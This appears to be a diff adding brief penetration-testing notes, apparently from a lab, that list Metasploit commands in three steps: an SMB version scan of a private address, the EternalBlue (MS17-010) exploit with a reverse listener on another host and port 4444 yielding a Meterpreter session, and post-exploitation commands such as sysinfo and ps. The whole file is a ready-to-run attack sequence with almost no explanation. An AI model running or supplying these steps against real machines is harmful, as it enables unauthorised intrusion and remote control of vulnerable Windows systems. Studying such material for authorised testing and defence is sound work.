@@ -1,0 +1,22 @@
+*For Scanning*
+msfconsole
+use auxiliary/scanner/smb/smb_version
+set RHOSTS 192.168.100.66
+run
+exit
+
+*For Exploit*
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+set RHOSTS 192.168.100.66
+set LHOST 192.168.100.67
+set LPORT 4444
+run
+*Meterpreter Session 1 opened*
+
+*For Post Exploitation*
+sysinfo
+ps
+sessions -k 1
+exit
